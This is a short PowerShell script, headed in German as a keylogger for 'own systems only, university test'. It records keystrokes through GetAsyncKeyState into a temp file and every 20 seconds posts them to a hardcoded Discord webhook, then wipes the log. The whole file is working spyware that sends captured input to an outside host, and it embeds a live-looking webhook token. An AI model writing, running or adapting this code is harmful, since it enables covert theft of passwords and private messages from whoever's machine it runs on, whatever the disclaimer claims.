# PowerShell Keylogger & Discord-Webhook-Sender (nur eigene Systeme, Uni-Test)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$logFile = "$env:TEMP\key.log"
$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

while ($true) {
    # 1. Tastatureingaben aufzeichnen
    foreach ($char in 32..126) {
        if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
            Add-Content -Path $logFile -Value ([char]$char)
        }
    }

    # 2. Alle X Sekunden Log an Discord schicken
    if ((Get-Date).Second % 20 -eq 0) {  # Alle 20 Sekunden
        if (Test-Path $logFile) {
            $keylog = Get-Content $logFile -Raw
            if ($keylog.Trim().Length -gt 0) {
                Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
                Clear-Content $logFile  # Nach dem Senden leeren
            }
        }
        Start-Sleep -Seconds 1
    } else {
        Start-Sleep -Milliseconds 40
    }
}
